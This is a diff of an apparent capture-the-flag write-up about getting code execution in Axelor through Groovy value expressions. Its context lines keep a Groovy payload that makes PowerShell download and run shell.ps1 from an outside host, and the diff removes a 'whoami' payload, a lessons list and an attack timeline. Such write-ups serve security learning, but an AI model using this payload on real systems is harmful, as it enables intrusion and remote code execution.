@@ -162,11 +162,6 @@ Groovy payload to execute system commands:
 java.lang.Runtime.getRuntime().exec(new String[]{"powershell", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.216/shell.ps1')"})
 ```
 
-Or simpler (Windows):
-```groovy
-java.lang.Runtime.getRuntime().exec("cmd /c whoami")
-```
-
 ### Step 10: Exploitation Setup
 
 **Step 1: Prepare the payload**
@@ -228,9 +223,7 @@ dir \\<DC>\c$
 
 **Finding the flag:**
 
-Flags are typically in:
-- Desktop
-- Documents  
+The flags were in:
 - Administrator home directory
 - Application data folders
 
@@ -258,28 +251,6 @@ The value expression field in custom model creation passes user input directly t
 2. **Groovy scripting** - Flexible enough to call Java APIs
 3. **No sandboxing** - Expressions evaluated in the full application context
 4. **Admin-accessible** - Model management only requires authentication (not even admin)
-
-## Key Lessons
-
-1. **Default credentials are dangerous** - Always change them in production
-2. **Expression languages are risky** - When user input reaches Groovy/JavaScript/Velocity, code execution is usually possible
-3. **Enumeration is worth time** - LDAP, SMB, and Tomcat all provided crucial intel
-4. **Tomcat deployments need hardening** - Service running as unprivileged user would have limited post-exploitation impact
-5. **Known vulnerable versions exist** - Axelor 5.4.10 has documented RCE vectors
-
-## Attack Timeline
-
-```
-0:00 - Port scan and service discovery
-5:00 - LDAP enumeration
-10:00 - SMB share browsing
-15:00 - Tomcat access and authentication
-20:00 - Application feature mapping
-30:00 - Vulnerability identification (value expressions)
-45:00 - Payload preparation
-60:00 - Exploitation setup and RCE
-90:00 - Post-exploitation and flag retrieval
-```
 
 ## Lessons for Future Targets
 
